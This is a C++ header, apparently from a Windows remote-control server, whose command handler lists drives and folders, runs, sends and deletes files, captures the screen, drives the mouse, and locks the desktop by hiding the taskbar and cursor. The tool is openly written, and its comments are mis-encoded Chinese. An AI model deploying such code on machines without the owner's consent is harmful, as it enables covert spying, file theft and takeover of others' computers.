#pragma once
#include<map>
#include"ServerSocket.h"
#include<atlimage.h>
#include <direct.h>
#include"Tool.h"
#include<stdio.h>
#include<io.h>
#include<list>
#include "LockInfoDialog.h"
#include "Resource.h"

using namespace std;
class CCommand
{
public:
	CCommand();
    ~CCommand() {};
	int ExcuteCommand(int nCmd);
protected:
	typedef int(CCommand::* CMDFUNC)();//��Ա����ָ��
	map<int, CMDFUNC> m_mapFunction;//������ŵ�ָ���ӳ��
    CLockInfoDialog dlg;
    unsigned threadid ;
protected:
   static unsigned _stdcall threadLockDlg(void* arg) {
       CCommand* thiz = (CCommand*)arg;
       thiz->threadLockDlgMain();
        _endthreadex(0);
        return 0;
    }

   void threadLockDlgMain() {
       dlg.Create(IDD_DIALOG_INFO, NULL);
       dlg.ShowWindow(SW_SHOW);
       //�ڱκ�̨
       CRect rect;
       rect.left = 0;
       rect.top = 0;
       rect.right = GetSystemMetrics(SM_CXFULLSCREEN);//w1
       rect.bottom = GetSystemMetrics(SM_CXFULLSCREEN);
       rect.bottom = LONG(rect.bottom * 1.10);
       dlg.MoveWindow(rect);
       CWnd* pText = dlg.GetDlgItem(IDC_STATIC);
       if (pText) {
           CRect rtText;
           pText->GetWindowRect(rtText);
           int nWidth = rtText.Width();//w0
           int nHeight = rtText.Height();
           int x = (rect.right - nWidth) / 2;
           int y = (rect.bottom - nHeight) / 2;
           pText->MoveWindow(x, y, rtText.Width(), rtText.Height());
       };
       //�����ö�
       dlg.SetWindowPos(&dlg.wndTopMost, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
       //�������
       ShowCursor(false);
       //����������
       ::ShowWindow(::FindWindow(_T("shell_traywnd"), NULL), SW_HIDE);
       //���������Χ
       dlg.GetWindowRect(rect);
       rect.left = 0;
       rect.top = 0;
       rect.right = 1;
       rect.bottom = 1;
       ClipCursor(rect);
       MSG msg;
       while (GetMessage(&msg, NULL, 0, 0)) {
           TranslateMessage(&msg);
           DispatchMessage(&msg);
           if (msg.message == WM_KEYDOWN) {
               TRACE("msg:%08X wparam:%08X lparam:%08X\r\n", msg.message, msg.wParam, msg.lParam);
               if (msg.wParam == 0x41) {//��a�˳�
                   break;
               }
           }

       }
       ClipCursor(NULL);
       //�ָ����
       ShowCursor(TRUE);
       //�ظ�������
       ::ShowWindow(::FindWindow(_T("shell_traywnd"), NULL), SW_SHOW);
       dlg.DestroyWindow();
   }

    int MakeDriverInfo() {//1==>A 2==>B 3==>C .... 26==>Z
        string result;
        for (size_t i = 1; i < 26; i++)
        {
            if (_chdrive(i) == 0) {//�������0������ڸô��̷���
                if (result.size() > 0) result += ',';//�ָ�
                result += 'A' + i - 1;
            };
        }
        result += ',';
        CPacket pack(1, (BYTE*)result.c_str(), result.size());
        CTool::Dump((BYTE*)pack.Data(), pack.Size());
        CServerSocket::getInstance()->Send(pack);
        return 0;
    }

    int MakeDirctoryInfo() {
        string strPath;
        if (CServerSocket::getInstance()->GetFilePath(strPath) == false) {
            OutputDebugString(_T("����������󣬵�ǰ����ǻ�ȡ�ļ��б�"));
            return -1;
        };
        if (_chdir(strPath.c_str()) != 0) {//ת����Ŀ¼��
            FILEINFO finfo;
            finfo.HasNext = FALSE;
            /* finfo.IsInvalid = TRUE;
             finfo.IsDirectory = TRUE;
             memcpy(finfo.szFileName, strPath.c_str(), strPath.size());*/
            CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
            CServerSocket::getInstance()->Send(pack);
            OutputDebugString(_T("û�з��ʵ�ǰ�ļ���Ȩ��"));
            return -2;
        };
        _finddata_t fdata;
        intptr_t hfind = 0;
        //strPath += "*";
        if ((hfind = _findfirst("*", &fdata)) == -1) {
            OutputDebugString(_T("û���ҵ��κ��ļ�"));
            FILEINFO finfo;
            finfo.HasNext = FALSE;
            CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
            CServerSocket::getInstance()->Send(pack);
            return -3;
        };
        do {
            FILEINFO finfo;
            finfo.IsDirectory = (fdata.attrib & _A_SUBDIR) != 0;
            memcpy(finfo.szFileName, fdata.name, strlen(fdata.name));
            CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
            TRACE(" send dir [%s]\r\n", finfo.szFileName);
            CServerSocket::getInstance()->Send(pack);
        } while (!_findnext(hfind, &fdata));
        _findclose(hfind); // �ر��ļ����Ҿ��
        FILEINFO finfo;
        finfo.HasNext = FALSE;
        CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
        CServerSocket::getInstance()->Send(pack);

        return 0;
    }

    int RunFile() {
        string strPath;
        if (CServerSocket::getInstance()->GetFilePath(strPath) == false) {
            OutputDebugString(_T("�����������,���ļ�ʧ��"));
            return -1;
        };
        ShellExecuteA(NULL, NULL, strPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
        CPacket pack(3, NULL, 0);
        CServerSocket::getInstance()->Send(pack);
        return 0;
    };

    int DownLoadFile() {
        string strPath;
        long long data = 0;
        if (CServerSocket::getInstance()->GetFilePath(strPath) == false) {
            OutputDebugString(_T("�����������,�����ļ�ʧ��"));
            return -1;
        };
        FILE* pFile = NULL;
        errno_t err = fopen_s(&pFile, strPath.c_str(), "rb");//���������Ʒ�ʽ��
        if (err != 0) {
            CPacket pack(4, (BYTE*)&data, 8);
            CServerSocket::getInstance()->Send(pack);
            OutputDebugString(_T("���ļ�ʧ��"));
            return -1;
        }

        if (pFile != NULL) {
            //�ȷ����ļ���С
            fseek(pFile, 0, SEEK_END);
            data = _ftelli64(pFile);
            TRACE("Server nLength=%d\r\n", data);
            CPacket head(4, (BYTE*)&data, 8);
            CServerSocket::getInstance()->Send(head);
            fseek(pFile, 0, SEEK_SET);

            char buffer[1024];//ÿ�η�1k�İ�
            size_t rlen = 0;
            do {
                rlen = fread(buffer, 1, 1024, pFile);
                CPacket pack(4, (BYTE*)buffer, rlen);
                CServerSocket::getInstance()->Send(pack);
            } while (rlen >= 1024);
            fclose(pFile);
        }

        CPacket pack(4, NULL, 0);
        CServerSocket::getInstance()->Send(pack);
        return 0;

    }
    int  MouseEvent() {
        MOUSEEV mouse;
        if (CServerSocket::getInstance()->GetMouseEvent(mouse)) {
            DWORD nFlages = 0;
            switch (mouse.nButton) {
            case 0://���
                nFlages = 1;
                break;
            case 1://�Ҽ�
                nFlages = 2;
                break;
            case 2://�м�
                nFlages = 4;
                break;
            case 4://û�а���
                nFlages = 8;
                break;
            }
            if (nFlages != 8) SetCursorPos(mouse.ptXY.x, mouse.ptXY.y);
            switch (mouse.nAction) {
            case 0://����
                nFlages |= 0x10;
                break;
            case 1://˫��
                nFlages |= 0x20;
                break;
            case 2://����
                nFlages |= 0x40;
                break;
            case 3://�ɿ�
                nFlages |= 0x80;
                break;
            defult:
                break;
            }
            switch (nFlages) {
            case 0x21://���˫��
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
            case 0x11://�������
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
                break;
            case 0x41://�������
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
                break;
            case 0x81://����ɿ�
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
                break;
            case 0x22://�Ҽ�˫��
                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
            case 0x12://�Ҽ�����
                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
                break;
            case 0x42://�Ҽ�����
                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
                break;
            case 0x82://�Ҽ��ɿ�
                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
                break;
            case 0x24://�м�˫��
                mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
                mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
            case 0x14://�м�����
                mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
                mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
                break;
            case 0x44://�м�����
                mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
                break;
            case 0x84://�м��ɿ�
                mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
                break;
            case 0x08://����ƶ�
                mouse_event(MOUSEEVENTF_MOVE, 0, 0, 0, GetMessageExtraInfo());
                break;
            }

            CPacket pack(5, NULL, 0);
            CServerSocket::getInstance()->Send(pack);
            return 0;
        }
        else {
            OutputDebugString(_T("��ȡ������ʧ��"));
            return -1;
        };
    }

    int  SendScreen() {
        CImage screen;
        HDC hscreen = ::GetDC(NULL);//�õ���ǰ��Ļ���
        int nBitPerPixsl = GetDeviceCaps(hscreen, BITSPIXEL);
        int nWidth = GetDeviceCaps(hscreen, HORZRES);
        int nHeight = GetDeviceCaps(hscreen, VERTRES);
        screen.Create(nWidth, nHeight, nBitPerPixsl);//����ͼ�� 
        BitBlt(screen.GetDC(), 0, 0, nWidth, nHeight, hscreen, 0, 0, SRCCOPY);//����
        ReleaseDC(NULL, hscreen);//�ͷ�hscreen
        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, 0);
        if (hMem == NULL) return-1;
        IStream* pStream = NULL;
        HRESULT ret = CreateStreamOnHGlobal(hMem, TRUE, &pStream);
        if (ret == S_OK) {
            screen.Save(pStream, Gdiplus::ImageFormatPNG);//PNG��ʽ
            LARGE_INTEGER bg = { 0 };
            pStream->Seek(bg, STREAM_SEEK_SET, NULL);
            PBYTE pData = (PBYTE)GlobalLock(hMem);//�᷵��һ��ָ�򱻷����ڴ��ַ��ָ��
            SIZE_T nSize = GlobalSize(hMem);
            CPacket pack(6, pData, nSize);
            TRACE("Server picture size:%d\r\n", nSize);
            CServerSocket::getInstance()->Send(pack);
            GlobalUnlock(hMem);
        }
        pStream->Release();
        GlobalFree(hMem);
        screen.ReleaseDC();
        return 0;

    }

  
    int LockMachine() {
        if ((dlg.m_hWnd == NULL) || (dlg.m_hWnd == INVALID_HANDLE_VALUE))
            _beginthreadex(NULL, 0, &CCommand::threadLockDlg, this, 0, &threadid);
        CPacket pack(7, NULL, 0);
        CServerSocket::getInstance()->Send(pack);
        return 0;
    };
    int UnlockMachine() {
        PostThreadMessage(threadid, WM_KEYDOWN, 0X41, 0);
        CPacket pack(8, NULL, 0);
        CServerSocket::getInstance()->Send(pack);
        return 0;
    };

    int  TextConnect() {
        CPacket pack((WORD)1981, NULL, 0);
        CServerSocket::getInstance()->Send(pack);
        return 0;
    }
    int DeleteLocalFile() {
        string strPath;
        long long data = 0;
        if (CServerSocket::getInstance()->GetFilePath(strPath) == false) {
            OutputDebugString(_T("�����������,�����ļ�ʧ��"));
            return -1;
        };
        //TCHAR sPath[MAX_PATH] = _T("");
        //MultiByteToWideChar(CP_ACP,0,strPath.c_str(),strPath.size(),sPath,sizeof(sPath)/sizeof(TCHAR));
        DeleteFileA(strPath.c_str());
        CPacket pack(9, NULL, 0);
        bool ret = CServerSocket::getInstance()->Send(pack);
        TRACE("send ret=%d\r\n", ret);
        return 0;
    }
};

